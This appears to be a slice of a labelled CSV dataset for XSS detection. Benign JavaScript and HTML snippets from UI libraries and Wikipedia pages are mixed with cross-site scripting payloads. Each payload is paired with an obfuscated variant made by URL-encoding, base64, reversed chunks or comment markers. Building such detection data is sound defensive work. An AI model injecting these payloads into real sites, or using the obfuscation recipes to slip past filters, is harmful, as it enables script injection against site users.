sample_id,label,payload_original,payload_obfuscated,generator,recipe
598,0,} if (scrolledx + bounding.width > containerrect.right - offset || scrolledx + bounding.width > window.innerwidth - offset) { edges.right = true;,} if (scrolledx + bounding.width > containerrect.right - offset || scrolledx + bounding.width > window.innerwidth - offset) { edges.right = true;,llm_style_t1.5,none
599,0,definejqueryplugin(collapse); var top = 'top'; var bottom = 'bottom';,definejqueryplugin(collapse); var top = 'top'; var bottom = 'bottom';,llm_style_t1.5,none
600,0,"window.index.add({ href: 'http://materializecss.com/helpers.html', title: 'helpers',","window.index.add({ href: 'http://materializecss.com/helpers.html', title: 'helpers',",llm_style_t1.5,none
601,1,"<ins onclick=""alert(1)"">test</ins>",Eins%33C%2Ftest%22%3E1%29%rt%2822alek%3D%nclics%20o%3Cin,llm_style_t1.5,urlencode+reverse_chunks
602,0,"}function ba(a, c) {","}function ba(a, c) {",llm_style_t1.5,none
603,1,<i onpointerleave=alert(1)>xss</i>,3E%2Fi%ss%3C9%3Ex281%2lert%e%3Darleavointe20onp%3Ci%,llm_style_t1.5,urlencode+reverse_chunks
604,0,"<dt><a class=""reference internal"" href=""topics/practices.html""><span class=""doc"">common practices","<dt><a class=""reference internal"" href=""topics/practices.html""><span class=""doc"">common practices",llm_style_t1.5,none
605,1,"<sub onbeforepaste=""alert(1)"" contenteditable>test</sub>",%3Csub%20onbeforepaste%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fsub%3E,llm_style_t1.5,urlencode+whitespace_noise
606,1,"<th onkeypress=""alert(1)"" contenteditable>test</th>",JTI1MjUzQ3RoJTI1MjUyMG9ua2V5cHJlc3MlMjUyNTNEJTI1MjUyMmFsZXJ0JTI1MjUyODElMjUyNTI5JTI1MjUyMiUyNTI1MjBjb250ZW50ZWRpdGFibGUlMjUyNTNFdGVzdCUyNTI1M0MlMjUyNTJGdGglMjUyNTNF,llm_style_t1.5,double_urlencode+urlencode+base64
607,1,<body id=x tabindex=1 onbeforeactivate=alert(1)></body>,%3Cbody%20id%3Dx%20tabindex%3D1%20onbeforeactivate%3Dalert%281%29%3E%3C%2Fbody%3E,llm_style_t1.5,urlencode+whitespace_noise
608,0,"function countdecimals ( numstr ) { numstr = string(numstr); var pieces = numstr.split(""."");","function countdecimals ( numstr ) { numstr = string(numstr); var pieces = numstr.split(""."");",llm_style_t1.5,none
609,0,"this._element.setattribute('aria-modal', true) this._element.setattribute('role', 'dialog') this._element.scrolltop = 0","this._element.setattribute('aria-modal', true) this._element.setattribute('role', 'dialog') this._element.scrolltop = 0",llm_style_t1.5,none
610,1,"<style>:target {transform: rotate(180deg);}</style><kbd id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></kbd>",PHN0eWxlPjp0YXJnZXQge3RyYW5zZm9ybTogcm90YXRlKDE4MGRlZyk7fTwvc3R5bGU+PGtiZCBpZD14IHN0eWxlPSJ0cmFuc2l0aW9uOnRyYW5zZm9ybSAycyIgb250cmFuc2l0aW9ucnVuPWFsZXJ0KDEpPjwva2JkPg==,llm_style_t1.5,base64+html_entities
611,1,"<hgroup onmouseover=""alert(1)"">test</hgroup>",%253Chgroup%2520onmouseover%253D%2522alert%25281%2529%2522%253Etest%253C%252Fhgroup%253E,llm_style_t1.5,double_urlencode
612,1,<rp onpointerleave=alert(1)>xss</rp>,PHJwIG9ucG9pbnRlcmxlYXZlPWFsZXJ0KDEpPnhzczwvcnA%252B,llm_style_t1.5,base64+double_urlencode+whitespace_noise
613,0,"this.$floatingbtnsreverse.each((el) => { anim({ targets: el,","this.$floatingbtnsreverse.each((el) => { anim({ targets: el,",llm_style_t1.5,none
614,0,"}, { key: ""_animateimageout"", value: function _animateimageout() {","}, { key: ""_animateimageout"", value: function _animateimageout() {",llm_style_t1.5,none
615,1,"<a href=""vbscript:msgbox+1"">xss</a> <a href=""#"" onclick=""vbs:msgbox+1"">xss</a> <a href=""#"" onclick=""vbs:msgbox+1"">xss</a> <a href=""#"" onclick=""vbscript:msgbox+1"">xss</a> <a href=""#"" onclick=""vbscript:msgbox+1"">xss</a> <a href=""#"" language=vbs onclick=""vbscript:msgbox+1"">xss</a>",%3Ca%20href%3D%22vbscript%3Amsgbox%2B1%22%3Exss%3C%2Fa%3E%20%3Ca%20href%3D%22%23%22%20onclick%3D%22vbs%3Amsgbox%2B1%22%3Exss%3C%2Fa%3E%20%3Ca%20href%3D%22%23%22%20onclick%3D%22vbs%3Amsgbox%2B1%22%3Exss%3C%2Fa%3E%20%3Ca%20href%3D%22%23%22%20onclick%3D%22vbscript%3Amsgbox%2B1%22%3Exss%3C%2Fa%3E%20%3Ca%20href%3D%22%23%22%20onclick%3D%22vbscript%3Amsgbox%2B1%22%3Exss%3C%2Fa%3E%20%3Ca%20href%3D%22%23%22%20language%3Dvbs%20onclick%3D%22vbscript%3Amsgbox%2B1%22%3Exss%3C%2Fa%3E,llm_style_t1.5,urlencode
616,0,}); } _focusfocuseditem() {,}); } _focusfocuseditem() {,llm_style_t1.5,none
617,1,"<plaintext onmousemove=""alert(1)"">test</plaintext>",JTNDcG/*OBF*/xhaW50ZXh0JTIwb25tb3VzZW1vdmUlM0QlMjJhbGVydCUyODElMjklMjIlM0V0ZXN0JTNDJTJGcGxha/*OBF*/W50ZXh0JTNF,llm_style_t1.5,urlencode+base64
618,1,"<script src=""https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.12/purify.min.js""></script> <script> document.write(dompurify.sanitize('<img src onerror=alert(1)>')) </script>",%25253Cscript%252520src%25253D%252522https%25253A%25252F%25252Fcdnjs.cloudflare.com%25252Fajax%25252Flibs%25252Fdompurify%25252F2.0.12%25252Fpurify.min.js%252522%25253E%25253C%25252Fscript%25253E%252520%25253Cscript%25253E%252520document.write%252528dompurify.sanitize%252528%252527%25253Cimg%252520src%252520onerror%25253Dalert%2525281%252529%25253E%252527%252529%252529%252520%25253C%25252Fscript%25253E,llm_style_t1.5,urlencode+double_urlencode
619,0,"function chips(el, options) {","function chips(el, options) {",llm_style_t1.5,none
620,0,'dropdown-content select-dropdown ' + (this.ismultiple ? 'multiple-select-dropdown' : '') ); if (this.$selectoptions.length) {,'dropdown-content select-dropdown ' + (this.ismultiple ? 'multiple-select-dropdown' : '') ); if (this.$selectoptions.length) {,llm_style_t1.5,none
621,1,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><caption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></caption>",%26lt%3Bstyle%26gt/*OBF*/%3B%40keyframes%20x%7Bfrom%20%7B/*OBF*/left%3A0%3B%7Dto%20%7Bleft%3A%201000px%3B%7D%7D%3Atarget%20%7Banimation%3A10s%20ease-in-out%200s%201%20x%3B%7D%26lt%3B/*OBF*/%2Fstyle%26gt%3B%26lt%3Bcaption%20id%3Dx%20style%3D%26quot%3Bposition%3Aabsolute%3B%26quot%3B%20onanimationcancel%3D%26quot%3Balert%281%29%26quot%3B%26gt%3B%26lt%3B/*OBF*/%2Fcaption%26gt%3B,llm_style_t1.5,html_then_urlencode
622,1,<svg><summary onload=alert(1)></summary>,%253Csvg%253E%253Csummary%2520onload%253Dalert%25281%2529%253E%253C%252Fsummary%253E,llm_style_t1.5,double_urlencode
623,0,var element = state.elements[name]; // arrow is optional + virtual elements if (!ishtmlelement(element) || !getnodename(element)) { return;,var element = state.elements[name]; // arrow is optional + virtual elements if (!ishtmlelement(element) || !getnodename(element)) { return;,llm_style_t1.5,none
624,0,"} else if ( !array.isarray( entry ) || !entry.length || entry.length !== parsed.handles + 1 ) { throw new error(""nouislider: 'connect' option doesn't match handle count."");","} else if ( !array.isarray( entry ) || !entry.length || entry.length !== parsed.handles + 1 ) { throw new error(""nouislider: 'connect' option doesn't match handle count."");",llm_style_t1.5,none
625,0,this.el.m_range = undefined,this.el.m_range = undefined,llm_style_t1.5,none
626,0,"this._element.classlist.add(class_name_show) this._element.classlist.remove(class_name_showing) eventhandler.trigger(this._element, event_shown, { relatedtarget })","this._element.classlist.add(class_name_show) this._element.classlist.remove(class_name_showing) eventhandler.trigger(this._element, event_shown, { relatedtarget })",llm_style_t1.5,none
627,0,"}); var referenceclippingoffsets = getsideoffsets(referenceoverflow, referencerect); var popperescapeoffsets = getsideoffsets(popperaltoverflow, popperrect, preventedoffsets);","}); var referenceclippingoffsets = getsideoffsets(referenceoverflow, referencerect); var popperescapeoffsets = getsideoffsets(popperaltoverflow, popperrect, preventedoffsets);",llm_style_t1.5,none
628,0,"<li id=""cite_note-formal_methods_in_ai-43""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-formal_methods_in_ai_43-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-formal_methods_in_ai_43-1""><sup><i><b>b </b> </i> </sup> </a>","<li id=""cite_note-formal_methods_in_ai-43""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-formal_methods_in_ai_43-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-formal_methods_in_ai_43-1""><sup><i><b>b </b> </i> </sup> </a>",llm_style_t1.5,none
629,0,const selector = selectorengine.getselectorfromelement(elem) const filterelement = selectorengine.find(selector) .filter(foundelement => foundelement === this._element),const selector = selectorengine.getselectorfromelement(elem) const filterelement = selectorengine.find(selector) .filter(foundelement => foundelement === this._element),llm_style_t1.5,none
630,0,"<h4><span class=""mw-headline"" id=""anti-logic_or_scruffy"">anti-logic or scruffy","<h4><span class=""mw-headline"" id=""anti-logic_or_scruffy"">anti-logic or scruffy",llm_style_t1.5,none
631,0,"<li><a href=""/wiki/holographic_data_storage"" title=""holographic data storage"">holographic data storage </a> </li> </ul> </li>","<li><a href=""/wiki/holographic_data_storage"" title=""holographic data storage"">holographic data storage </a> </li> </ul> </li>",llm_style_t1.5,none
632,1,"<div draggable=""true"" contenteditable>drag me</div><menuitem ondragover=alert(1) contenteditable>drop here</menuitem>",PGRpdi8qT0JGKi8gZC8qT0JGKi9yYWdnYWJsZT0idH/*OBF*/J1ZSIgY29udGVudGVkaXRhYmxlPmRyYWcgbWU8L2Rpdj48bWVudWl0ZW0gb25k/*OBF*/cmFnb3YvKk9CRiovZXI9YWxlcnQoMSkgY29udC8qT0JGKi9lbnRlZGl0YWJsZT5kcm9wIGhlcmU8L21lbnVpdGVtPg%3D%3D,llm_style_t1.5,comment_marker+base64+html_then_urlencode
633,1,<s onblur=alert(1) tabindex=1 id=x></s><input autofocus>,<s onblur=alert/*  OBF*/(1) tabindex=1 id=x></s><input auto/*OBF*/focus>,llm_style_t1.5,comment_marker
634,1,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><* id=x style=""position:absolute;"" onanimationcancel=""print()""></*>",%253Cstyle%253E%2540ke/*OBF*/yframes%2520x%257Bfrom%2520%257Bleft%253A0%253B%257Dto%2520%257Bleft%253A%25201000px%253B%257D%257D%253Atarget%2520%257Banimation%253A10s%2520ease-in-out%25200s%25201%2520x%253B%257D%253C%252Fstyle%253E%253C%252A%2520id%253Dx%2520style%253D%2522position%253Aabsolute%253B%2522%2520onanimationcancel%253D%2522print%2528%2529%2522%253E%253C%252F%252A%253E,llm_style_t1.5,double_urlencode
635,0,const class_name_backdrop = 'offcanvas-backdrop'; const open_selector = '.offcanvas.show'; const event_show = `show${event_key}`;,const class_name_backdrop = 'offcanvas-backdrop'; const open_selector = '.offcanvas.show'; const event_show = `show${event_key}`;,llm_style_t1.5,none
636,1,<rp onpointerover=alert(1)>xss</rp>,%26lt%3Brp%20onpointerover%3Dalert%281%29%26gt%3Bxss%26lt%3B%2Frp%26gt%3B,llm_style_t1.5,html_then_urlencode
637,0,$('.toc-wrapper').pushpin({,$('.toc-wrapper').pushpin({,llm_style_t1.5,none
638,0,"this._handleclosetriggerclickbound = this._handleclosetriggerclick.bind(this); this.dragtarget.addeventlistener('touchmove', this._handledragtargetdragbound); this.dragtarget.addeventlistener('touchend', this._handledragtargetreleasebound);","this._handleclosetriggerclickbound = this._handleclosetriggerclick.bind(this); this.dragtarget.addeventlistener('touchmove', this._handledragtargetdragbound); this.dragtarget.addeventlistener('touchend', this._handledragtargetreleasebound);",llm_style_t1.5,none
639,0,_configaftermerge(config) { config.target = getelement(config.target) || document.body config.rootmargin = config.offset ? `${config.offset}px 0px -30%` : config.rootmargin,_configaftermerge(config) { config.target = getelement(config.target) || document.body config.rootmargin = config.offset ? `${config.offset}px 0px -30%` : config.rootmargin,llm_style_t1.5,none
640,1,<noframes onpointerleave=alert(1)>xss</noframes>,PG5vZnJhbWVzIG9ucG9pbnRlcmxlYXZlPWFsZXJ0KDEpPnhzczwgIC9ub2ZyYW1lcz4%3D,llm_style_t1.5,whitespace_noise+base64+urlencode
641,0,if (!(el instanceof element)) {,if (!(el instanceof element)) {,llm_style_t1.5,none
642,0,config.defaultinterval = config.interval; return config; },config.defaultinterval = config.interval; return config; },llm_style_t1.5,none
643,0,backdrop.classname = this._config.classname; if (this._config.isanimated) { backdrop.classlist.add(class_name_fade);,backdrop.classname = this._config.classname; if (this._config.isanimated) { backdrop.classlist.add(class_name_fade);,llm_style_t1.5,none
644,0,"</span> <span class=""toctext"">superintelligence","</span> <span class=""toctext"">superintelligence",llm_style_t1.5,none
645,0,value = `${value} ${this.amorpm}`; } this.el.value = value;,value = `${value} ${this.amorpm}`; } this.el.value = value;,llm_style_t1.5,none
646,1,"<colgroup oncut=""alert(1)"" contenteditable>test</colgroup>",%25253Ccolgroup%252520oncut%25253D%252522alert%2525281%252529%252522%252520contenteditable%25253Etest%25253C%25252Fcolgroup%25253E,llm_style_t1.5,double_urlencode+html_then_urlencode
647,0,"}function i(a, c) { return h.fnc(a) ? a(c.target, c.id, c.total) : a; }function e(a, c) {","}function i(a, c) { return h.fnc(a) ? a(c.target, c.id, c.total) : a; }function e(a, c) {",llm_style_t1.5,none
648,1,"<svg><use href=""data:image/svg+xml;base64,phn2zybpzd0neccgeg1sbnm9j2h0dha6ly93d3cudzmub3jnlziwmdavc3znjyb4bwxuczp4bgluaz0nahr0cdovl3d3dy53my5vcmcvmtk5os94bgluaycgd2lkdgg9jzewmccgagvpz2h0pscxmdanpgo8aw1hz2ugahjlzj0imsigb25lcnjvcj0iywxlcnqomskiic8+cjwvc3znpg==#x"" /></svg>",PHN2Zz48dXNlIGhyZWY9ImRhdGE6aW1hZ2Uvc3ZnK3htbDtiYXNlNjQscGhuMnp5YnB6ZDBuZWNjZ2VnMXNibm05ajJoMGRoYTZseTkzZDNjdWR6bXViM2pubHppd21kYXZjM3puanliNGJ3eHVjenA0YmdsdWF6MG5haHIwY2RvdmwzZDNkeTUzbXk1dmNtY3ZtdGs1b3M5NGJnbHVheWNnZDJsa2RnZzlqemV3bWNjZ2FndnB6MmgwcHNjeG1kYW5wZ284YXcxaHoydWdhaGpsemowaW1zaWdiMjVsY25qdmNqMGl5d3hsY25xb21za2lpYzgrY2p3dmMzem5wZz09I3giIC8%252BPC9zdmc%252B,llm_style_t1.5,base64+double_urlencode
649,0,this._element.style[property] = `${scrollbarwidth}px`,this._element.style[property] = `${scrollbarwidth}px`,llm_style_t1.5,none
650,1,"<script onmouseover=""alert(1)"">test</script>",%3C/*OBF*/script%20onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fscript%3E,llm_style_t1.5,urlencode+comment_marker
651,1,"<video><source src=""//evil?",PHZpZGVvPjwgc291cmNlIHNyYz0iLy9ldmlsPw%3D%3D,llm_style_t1.5,whitespace_noise+base64+urlencode
652,1,<address id=x tabindex=1 onbeforeactivate=alert(1)></address>,%252526lt%25253Bad/*OBF*/dress%252520id%25253Dx%252520tabindex%25253D1%252520onbeforeactivate%25253Dalert%2525281%252529%252526gt%25253B%252526lt%25253B%25252Faddress%252526gt%25253B,llm_style_t1.5,html_then_urlencode+double_urlencode
653,1,<article onpointermove=alert(1)>xss</article>,%26gt%3Bicle%2Fartxss%26lt%3B%281%29%26gt%3Blertve%3Daermooint%20onpicle%26lt%3Bar/*OBF*/t,llm_style_t1.5,reverse_chunks+html_entities+urlencode
654,1,<input id=x onfocus=alert(1)>,<input id=x onfocus=alert(1)>,llm_style_t1.5,comment_marker
655,0,"return unique(elems); }, has: function (selector) {","return unique(elems); }, has: function (selector) {",llm_style_t1.5,none
656,0,} element.classlist.add(class_name_show); this._emulateanimation(() => {,} element.classlist.add(class_name_show); this._emulateanimation(() => {,llm_style_t1.5,none
657,1,"<main onmouseover=""alert(1)"">test</main>",%25253Cmain%252520onmouseover%25253D%252522alert%2525281%252529%252522%25253Etest%25253C%25252Fmain%25253E,llm_style_t1.5,double_urlencode+html_then_urlencode
658,0,"return fn.apply(target, [event]) } }","return fn.apply(target, [event]) } }",llm_style_t1.5,none
659,0,value: function _animateout(index) { var _this7 = this; var $collapsibleli = this.$el.children('li').eq(index);,value: function _animateout(index) { var _this7 = this; var $collapsibleli = this.$el.children('li').eq(index);,llm_style_t1.5,none
660,1,"<cite onpaste=""alert(1)"" contenteditable>test</cite>",JTI1MjUzQ2NpdGUlMjUyNTIwb25wYXN0ZSUyNTI1M0QlMjUyNTIyYWxlcnQlMjUyNTI4MSUyNTI1MjklMjUyNTIyJTI1MjUyMGNvbnRlbnRlZGl0YWJsZSUyNTI1M0V0ZXN0JTI1MjUzQyUyNTI1MkZjaXRlJTI1MjUzRQ==,llm_style_t1.5,double_urlencode+urlencode+base64
661,1,<div ongestureend=alert(1)>xss</div>,%26lt%3Bdiv%20ongestureend%3Dalert%281%29%26gt%3Bxss%26lt%3B%2Fdiv%26gt%3B,llm_style_t1.5,html_then_urlencode+html_entities+whitespace_noise
662,0,"translatey: _this50.offsety,","translatey: _this50.offsety,",llm_style_t1.5,none
663,0,} else { length = this.length = elems.length; for (; i < length; i++) {,} else { length = this.length = elems.length; for (; i < length; i++) {,llm_style_t1.5,none
664,1,"<base oncopy=""alert(1)"" contenteditable>test</base>",PGJhc2Ugb25jb3B5PSJhbGVydCgxKSIgY29ud/*OBF*/GVudGVk/*OBF*/aXRhYmxlPnRlc3Q8L2Jhc2U%2B,llm_style_t1.5,base64+html_entities+html_then_urlencode
665,0,"</span> <span class=""reference-text""><cite class=""citation news"">lohr, steve (2017). <a rel=""nofollow"" class=""external text"" href=""https://www.nytimes.com/2017/01/12/technology/robots-will-take-jobs-but-not-as-fast-as-some-fear-new-report-says.html"">""robots will take jobs, but not as fast as some fear, new report says"" </a>. <i>the new york times </i><span class=""reference-accessdate"">. retrieved <span class=""nowrap"">13 january","</span> <span class=""reference-text""><cite class=""citation news"">lohr, steve (2017). <a rel=""nofollow"" class=""external text"" href=""https://www.nytimes.com/2017/01/12/technology/robots-will-take-jobs-but-not-as-fast-as-some-fear-new-report-says.html"">""robots will take jobs, but not as fast as some fear, new report says"" </a>. <i>the new york times </i><span class=""reference-accessdate"">. retrieved <span class=""nowrap"">13 january",llm_style_t1.5,none
666,1,"<cite onkeyup=""alert(1)"" contenteditable>test</cite>","<  cite onkeyup="" alert(1)  "" contenteditable> test</cite>",llm_style_t1.5,whitespace_noise
667,0,_showrangebubble() {,_showrangebubble() {,llm_style_t1.5,none
668,0,"function _interopnamespacedefault(e) { const n = object.create(null, { [symbol.tostringtag]: { value: 'module' } }); if (e) {","function _interopnamespacedefault(e) { const n = object.create(null, { [symbol.tostringtag]: { value: 'module' } }); if (e) {",llm_style_t1.5,none
669,0,const getselector = element => { let selector = element.getattribute('data-bs-target') if (!selector || selector === '#') {,const getselector = element => { let selector = element.getattribute('data-bs-target') if (!selector || selector === '#') {,llm_style_t1.5,none
670,0,if (e.keycode === 27) {,if (e.keycode === 27) {,llm_style_t1.5,none
671,1,"<plaintext draggable=""true"" ondragleave=""alert(1)"">test</plaintext>",JTI1M0NwbGFpbnRleHQlMjUyMGRyYWdnYWJsZSUyNTNEJTI1MjJ0cnVlJTI1MjIlMjUyMG9uZHJhZ2xlYXZlJTI1M0QlMjUyMmFsZXJ0JTI1MjgxJTI1MjklMjUyMiUyNTNFdGVzdCUyNTNDJT/*OBF*/I1MkZwbGFpbnRleHQlMjUzRQ==,llm_style_t1.5,double_urlencode+base64
672,0,"throw new error(""nouislider: 'step' is not numeric.""); } parsed.singlestep = entry;","throw new error(""nouislider: 'step' is not numeric.""); } parsed.singlestep = entry;",llm_style_t1.5,none
673,1,<meter onpointerout=alert(1)>xss</meter>,%253Cmeter%2520onpointerout%253Dalert%25281%2529%253Exss%253C%252Fmeter%253E,llm_style_t1.5,whitespace_noise+double_urlencode
674,1,"http://subdomain1.portswigger-labs.net/xss/xss.php?x=%3cscript%3ename=%22=alert(1)%22;location=%22https://portswigger-labs.net/xss/xss.php?x=%3cscript%3ethrow%20onerror=eval,name%3c%5c/script%3e%22%3c/script%3e",t%253e%2Fscrip522%253ct%253e%2%2Fscrip53c%255c2Cname%2%3Deval%0onerrorhrow%252pt%253et253cscri%3Fx%3D%Fxss.php%2Fxss%2labs.netswigger-F%2Fporttps%3A%2D%2522htcation%3522%3Blo281%29%23Dalert%3D%2522%53ename%script%2%3D%253c.php%3Fxss%2Fxss.net%2Fxger-labsportswigdomain1.2F%2Fsubhttp%3A%,llm_style_t1.5,html_then_urlencode+reverse_chunks
675,0,}); element.innerhtml = out; return element;,}); element.innerhtml = out; return element;,llm_style_t1.5,none
676,0,"var child = elem ? cash(elem)[0] : this[0], collection = elem ? this : cash(child).parent().children(); return slice.call(collection).indexof(child);","var child = elem ? cash(elem)[0] : this[0], collection = elem ? this : cash(child).parent().children(); return slice.call(collection).indexof(child);",llm_style_t1.5,none
677,0,$(this.dropdownoptions) .find('li') .removeclass('selected');,$(this.dropdownoptions) .find('li') .removeclass('selected');,llm_style_t1.5,none
678,0,const themeswitcherlabel = `${themeswitchertext.textcontent} (${btntoactive.dataset.bsthemevalue})`,const themeswitcherlabel = `${themeswitchertext.textcontent} (${btntoactive.dataset.bsthemevalue})`,llm_style_t1.5,none
679,0,"<li><a href=""/wiki/phenomenology_(philosophy)"" title=""phenomenology (philosophy)"">phenomenology </a> </li>","<li><a href=""/wiki/phenomenology_(philosophy)"" title=""phenomenology (philosophy)"">phenomenology </a> </li>",llm_style_t1.5,none
680,1,"<div draggable=""true"" contenteditable>drag me</div><article ondragover=alert(1) contenteditable>drop here</article>",%3Cdiv%20dragg/*OBF*/able%3D%22true%22%20conten/*OBF*/teditable%3Edrag%20me%3C%2Fdiv%3E%3Carticle%20ondragover%3Dalert%281%29%20contenteditable%3Edrop%20here%3C%2Farticle%3E,llm_style_t1.5,urlencode
681,0,"$card.data( 'initialoverflow', $card.css('overflow') === undefined ? '' : $card.css('overflow')","$card.data( 'initialoverflow', $card.css('overflow') === undefined ? '' : $card.css('overflow')",llm_style_t1.5,none
682,0,"stepafter: { startvalue: this.xval[j-0], step: this.xnumsteps[j-0], higheststep: this.xhighestcompletestep[j-0] } }; };","stepafter: { startvalue: this.xval[j-0], step: this.xnumsteps[j-0], higheststep: this.xhighestcompletestep[j-0] } }; };",llm_style_t1.5,none
683,1,<span onpointerup=alert(1)>xss</span>,%253Cspan%2520onpointerup%253Dalert%25281%2529%253Exss%253C%252Fspan%253E,llm_style_t1.5,urlencode+html_then_urlencode
684,0,"this._setattributeifnotexists(outerelem, 'role', 'presentation') } if (!isactive) {","this._setattributeifnotexists(outerelem, 'role', 'presentation') } if (!isactive) {",llm_style_t1.5,none
685,1,<tr id=x tabindex=1 onfocus=alert(1)></tr>,<tr id=x tabind/*OBF*/ex=1 onfocus=  alert(1)></ tr>,llm_style_t1.5,whitespace_noise
686,0,} else if ($target.closest('.month-prev').length) { this.prevmonth(); } else if ($target.closest('.month-next').length) {,} else if ($target.closest('.month-prev').length) { this.prevmonth(); } else if ($target.closest('.month-next').length) {,llm_style_t1.5,none
687,0,"_classcallcheck(this, carousel); var _this62 = _possibleconstructorreturn(this, (carousel.__proto__ || object.getprototypeof(carousel)).call(this, carousel, el, options)); _this62.el.m_carousel = _this62;","_classcallcheck(this, carousel); var _this62 = _possibleconstructorreturn(this, (carousel.__proto__ || object.getprototypeof(carousel)).call(this, carousel, el, options)); _this62.el.m_carousel = _this62;",llm_style_t1.5,none
688,0,}); } $collapsibleli[0].classlist.add('active');,}); } $collapsibleli[0].classlist.add('active');,llm_style_t1.5,none
689,0,"target.classlist.add(class_name_active) this._activateparents(target) eventhandler.trigger(this._element, event_activate, { relatedtarget: target })","target.classlist.add(class_name_active) this._activateparents(target) eventhandler.trigger(this._element, event_activate, { relatedtarget: target })",llm_style_t1.5,none
690,1,"<style>@keyframes x{}</style><dir style=""animation-name:x"" onanimationstart=""alert(1)""></dir>","<style>  @keyframes x{}</style><dir style=""  animation-name:x"" onanimationstart=""alert(1) ""><  /dir>",llm_style_t1.5,whitespace_noise
691,0,do { prefix += math.floor(math.random() * max_uid) } while (document.getelementbyid(prefix)),do { prefix += math.floor(math.random() * max_uid) } while (document.getelementbyid(prefix)),llm_style_t1.5,none
692,0,"<li><a href=""/wiki/very_large_scale_integration"" title=""very large scale integration"">very large scale integration </a> </li>","<li><a href=""/wiki/very_large_scale_integration"" title=""very large scale integration"">very large scale integration </a> </li>",llm_style_t1.5,none
693,1,"<footer onmousedown=""alert(1)"">test</footer>",PGZvb3RlciBvbm1vdXNlZG93bj0iYWxlcnQoMSkiPnRlc3Q8L2Zvb3Rlcj4%253D,llm_style_t1.5,base64+double_urlencode
694,1,"<tbody onkeydown=""alert(1)"" contenteditable>test</tbody>",%253C%2520tbody%2520onkeydown%253D%2522alert%25281%2529%2522%2520contenteditable%253Etest%253C%252Ftbody%253E,llm_style_t1.5,whitespace_noise+double_urlencode
695,1,"<br onkeyup=""alert(1)"" contenteditable>test</br>",3EC%2Fbr%Etest%3table%3tentedi2%20con81%29%2alert%2p%3D%220onkeyu%3Cbr%2,llm_style_t1.5,urlencode+reverse_chunks
696,0,"<p>ai has developed many tools to solve the most difficult problems in <a href=""/wiki/computer_science"" title=""computer science"">computer science </a>. a few of the most general of these methods are discussed below.","<p>ai has developed many tools to solve the most difficult problems in <a href=""/wiki/computer_science"" title=""computer science"">computer science </a>. a few of the most general of these methods are discussed below.",llm_style_t1.5,none
697,0,offset } = this._config; if (typeof offset === 'string') {,offset } = this._config; if (typeof offset === 'string') {,llm_style_t1.5,none
698,1,"<isindex draggable=""true"" ondragenter=""alert(1)"">test</isindex>",PGlzaW5kZXggZHJhZ2dhYmxlPSJ0cnVlIiBvbmRyYWdlbnRlcj0iYWxlcnQoMSkiPnRlc3Q8L2lzaW5kZXg%2B,llm_style_t1.5,base64+urlencode+whitespace_noise
699,0,const elements = selectorengine.focusablechildren(trapelement) if (elements.length === 0) { trapelement.focus(),const elements = selectorengine.focusablechildren(trapelement) if (elements.length === 0) { trapelement.focus(),llm_style_t1.5,none
700,0,return template; } _typecheckconfig(config) {,return template; } _typecheckconfig(config) {,llm_style_t1.5,none
701,0,".find('li') .removeclass('selected'); $(optionel).toggleclass('selected', selected);",".find('li') .removeclass('selected'); $(optionel).toggleclass('selected', selected);",llm_style_t1.5,none
702,0,return } element.classlist.add(class_name_active),return } element.classlist.add(class_name_active),llm_style_t1.5,none
703,0,scalefactor = windowwidth / backdrop[0].clientwidth; this.btnbottom = btnrect.bottom; this.btnleft = btnrect.left;,scalefactor = windowwidth / backdrop[0].clientwidth; this.btnbottom = btnrect.bottom; this.btnleft = btnrect.left;,llm_style_t1.5,none
704,0,import eventhandler from '../dom/event-handler.js' import selectorengine from '../dom/selector-engine.js' import config from './config.js',import eventhandler from '../dom/event-handler.js' import selectorengine from '../dom/selector-engine.js' import config from './config.js',llm_style_t1.5,none
705,1,<th onpointerleave=alert(1)>xss</th>,&lt;th onpointerleave=alert(  1)&gt;xss&lt; / th&gt; ,llm_style_t1.5,whitespace_noise+html_entities
